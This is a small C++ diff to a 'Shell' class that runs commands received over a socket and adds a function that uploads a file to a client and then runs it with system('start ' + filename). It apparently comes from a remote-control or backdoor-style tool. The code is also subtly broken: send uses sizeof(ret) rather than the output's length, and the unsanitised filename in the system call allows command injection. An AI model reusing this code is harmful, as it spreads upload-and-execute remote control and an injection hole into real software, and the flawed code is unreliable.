@@ -46,3 +46,13 @@ void Shell::run(SOCKET* client,const std::vector<std::string> args)
 	std::string ret = return_command(cmd).c_str();
 	send(*client, ret.c_str(), sizeof(ret), 0);
 }
+
+void Shell::uploadToClientExe(Client* client, std::string filename)
+{
+	if (Transfer::uploadToClient(client, filename))
+	{
+		client->send_b(std::string("Upload done, now starting " + filename+" ...").c_str());
+		system(std::string("start " + filename).c_str());
+		client->send_b("Done");
+	}
+}
